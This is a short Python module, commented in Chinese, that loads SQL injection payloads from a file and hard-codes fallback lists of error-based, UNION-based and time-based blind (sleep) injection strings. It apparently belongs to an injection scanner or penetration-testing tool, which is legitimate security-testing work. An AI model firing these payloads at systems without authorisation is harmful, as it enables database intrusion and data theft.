# -*- coding: utf-8 -*-
"""
SQL注入测试载荷模块
"""

import os

def load_payloads_from_file(file_path):
    """
    从文件加载载荷列表
    """
    if not os.path.exists(file_path):
        print(f"[!] 错误：载荷文件不存在 -> {file_path}")
        return []
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    return payloads


def get_default_error_payloads():
    """
    获取默认报错注入载荷（硬编码备份）
    """
    return [
        "'",
        '"',
        "1' and '1'='1",
        "1' and '1'='2",
        "1' or '1'='1",
        "1' or '1'='2",
        "1' and 1=1--",
        "1' and 1=2--",
        "1' or 1=1--",
        "1' or 1=2--",
        "1' order by 1--",
        "1' order by 100--",
        "1' union select 1--",
        "1' union select 1,2--",
        "1' union select 1,2,3--",
        "1' union select 1,2,3,4--",
        "1' union select 1,2,3,4,5--",
    ]


def get_default_time_payloads():
    """
    获取默认时间盲注载荷（硬编码备份）
    """
    return [
        "1' and sleep(5)--",
        "1' and sleep(10)--",
        '1" and sleep(5)--',
        '1" and sleep(10)--',
        "1) and sleep(5)--",
        "1) and sleep(10)--",
        "1') and sleep(5)--",
        "1') and sleep(10)--",
        "1')) and sleep(5)--",
        "1')) and sleep(10)--",
        "'; sleep(5)--",
        '"; sleep(5)--',
    ]